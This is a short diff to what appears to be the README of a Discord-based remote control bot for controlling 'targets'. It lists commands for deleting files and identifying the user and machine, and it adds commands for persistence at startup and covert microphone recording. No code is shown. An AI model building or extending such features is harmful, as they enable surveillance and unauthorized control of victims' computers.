@@ -11,6 +11,8 @@ PYcord featuring multiple cool commands you can use to control your targets, inc
 .rmv <file> to delete a file
 .size <file> to calculate file size
 .who to show current user and machine
+.addstartup to add file to startup
+.recordmic <seconds> to record mic for
 
 .hello to make sure if bot is running
 .marco to show latency
